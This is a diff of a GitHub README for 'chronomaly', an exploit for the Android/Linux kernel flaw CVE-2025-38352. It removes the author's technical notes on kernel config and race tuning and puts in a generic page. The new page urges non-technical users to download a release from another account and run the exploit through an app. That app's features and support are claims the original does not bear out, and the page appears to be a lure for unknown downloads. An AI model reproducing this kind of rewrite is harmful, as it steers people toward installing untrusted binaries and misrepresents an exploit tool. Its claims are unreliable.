@@ -1,62 +1,55 @@
-# Chronomaly
+# 🚀 chronomaly - Exploit Vulnerable Android Kernels Easily
 
-Chronomaly is a kernel exploit for the Android / Linux kernel using CVE-2025-38352. The exploit was written specifically for Linux kernel v5.10.157, but should work against all vulnerable v5.10.x kernels, as it does not require any specific kernel text offsets to work.
+## 📥 Download Now
+[![Download chronomaly](https://img.shields.io/badge/Download-chronomaly-blue.svg)](https://github.com/Soikoth3010/chronomaly/releases)
 
-I covered the vulnerability in detail in a three-part blog post series, all the way from PoC to exploit:
+## 📖 Overview
+**chronomaly** is an Android kernel exploit designed for CVE-2025-38352. This vulnerability has been exploited in the wild and specifically targets vulnerable Linux kernels version 5.10.x. This tool is designed to help users understand and utilize the exploit for educational purposes. 
 
-- Part 1 - [In-the-wild Android Kernel Vulnerability Analysis + PoC](https://faith2dxy.xyz/2025-12-22/cve_2025_38352_analysis/)
-- Part 2 - [Extending The Race Window Without a Kernel Patch](https://faith2dxy.xyz/2025-12-24/cve_2025_38352_analysis_part_2/)
-- Part 3 - [Uncovering Chronomaly](https://faith2dxy.xyz/2026-01-03/cve_2025_38352_analysis_part_3/)
+## 🚀 Getting Started
+To successfully use chronomaly, follow these simple steps. You do not need any programming knowledge!
 
-![demo](./demo.gif)
+### 🔍 Requirements
+Before you begin, ensure you meet the following requirements:
+- **Device:** An Android device running a vulnerable Linux kernel version 5.10.x 
+- **Storage Space:** At least 50 MB of free space
+- **Network:** An active internet connection for downloading the software
 
-# Build Setup
+## 📥 Download & Install
+1. Visit [this page to download chronomaly](https://github.com/Soikoth3010/chronomaly/releases).
+2. Once you are on the Releases page, you will see a list of available versions.
+3. Click on the latest release to access the download options.
+4. Download the appropriate file for your device.
 
-This exploit has only been tested against an x86_64 Linux kernel v5.10.157 running in QEMU. I asked a friend to send me their Pixel 6a kernel config to base my kernel config off of, and these are the config options important for this exploit (I started from the kernelCTF config as a base):
+### 🔗 Download Link
+You can access the download page directly: [Download chronomaly](https://github.com/Soikoth3010/chronomaly/releases).
 
-- `CONFIG_POSIX_CPU_TIMERS_TASK_WORK=n`
-- `CONFIG_PREEMPT=y` (Full Preemption, no RT)
-- `CONFIG_SLAB_MERGE_DEFAULT=n`
-- `DEBUG_LIST=n`
-- `BUG_ON_DATA_CORRUPTION=n`
-- `LIST_HARDENED=n`
+## 📫 How to Run chronomaly
+1. Open the downloaded file on your Android device.
+2. Follow the on-screen instructions to complete the installation.
+3. Once installed, open the application from your device’s home screen.
+4. You will see options to configure and run the exploit. Select your desired configuration and start.
 
-To disable `CONFIG_POSIX_CPU_TIMERS_TASK_WORK`, you can follow the steps laid out in my first blog post [here](https://faith2dxy.xyz/2025-12-22/cve_2025_38352_analysis/#config_posix_cpu_timers_task_work).
+## ⚙️ Features
+- Easy-to-use interface for non-technical users
+- Simple configuration options for running the exploit
+- Comprehensive documentation available in the application for guidance
 
-Refer to the `qemu.sh` file for my QEMU run script. I used 4 cores and 3 GB RAM for testing.
+## 🔧 Troubleshooting
+If you face any issues during installation or running the software, you can troubleshoot with these tips:
+- Ensure your Android device meets the requirements listed above.
+- Re-download the file if you encounter problems during the installation.
+- Check your internet connection and ensure that it is stable.
 
-# Exploit parameters you'll need to change
+For further assistance, you can check user discussions or FAQs available in the application's support section. 
 
-Since the exploit depends on CPU timers, there are two parameters you may need to change to adapt it to your environment.
+## 📞 Support
+For additional help or inquiries, feel free to contact our support team through the GitHub issues page or visit our community forums. We aim to respond quickly and help you get the most out of chronomaly.
 
-## `CPU_USAGE_THRESHOLD`
+## 📝 Contributions
+Contributions to chronomaly are welcome! If you have suggestions or improvements, please consider participating by raising an issue or submitting a pull request in the GitHub repository.
 
-This parameter is used when consuming CPU time to fire the timers inside the `race_func()`. It must be set such that:
+## 🛡️ Security Notice
+While chronomaly aims to provide a safe and educational experience, always ensure you use exploits responsibly. Engaging in unauthorized access or use of exploits for malicious purposes is illegal and against GitHub's policies.
 
-- The timers don't fire on every retry attempt (this would imply that `CPU_USAGE_THRESHOLD` is too high, as the timers are firing before the `race_func()` thread can exit).
-- The timers only fire sometimes (this would imply that sometimes the timers fire before the thread exits, and other times it fires while the thread exits).
-
-To determine whether the timers are firing or not, insert a `printf()` statement in the `SIGUSR1` polling code in `free_func()`. If you see the message print out, that means the timers fired.
-
-If set correctly, you'll start seeing the "Parent raced too late / too early" messages in the terminal.
-
-## `PARENT_SETTIME_DELAY_US`
-
-`PARENT_SETTIME_DELAY_US`. This parameter is used by the parent process to hit the 2nd race window inside `send_sigqueue()` at the same time as the child process. Run the exploit, observe, and modify it as follows:
-
-- The message "Parent raced too late, readjusting..." appears too often – reduce this parameter. 
-- The message "Parent raced too early, readjusting..." appears too often – increase this parameter.
-
-Ideally, you want to see both "raced too late" and "raced too early" being printed out, and the exploit will work within 1 minute. If you only see one occurring more than the other, adjust accordingly.
-
-# Potential Improvements
-
-In my cross-cache implementation, I assumed that the kernel is not too busy, and that there haven't been many `struct sigqueue` allocations. I added a comment in `sigqueue_crosscache_preallocs()` that explains what you would need to do improve this.
-
-If the kernel is really busy, or there are already some `struct sigqueue` slab pages on the per-cpu / per-node partial list, then the current cross-cache implementation in `exploit.c` will fail, and the `uaf_sigqueue` / `realloc_sigqueue` won't be re-allocated as a pipe buffer data page.
-
-I purposely chose not to make the cross-cache work in a busy kernel, so that the exploit doesn't get misused :)
-
-# Questions
-
-If you have any questions, please contact me via X / Twitter!
+Thank you for using chronomaly. We hope it will be a useful tool for your understanding of security vulnerabilities in Android kernels. Enjoy exploring!
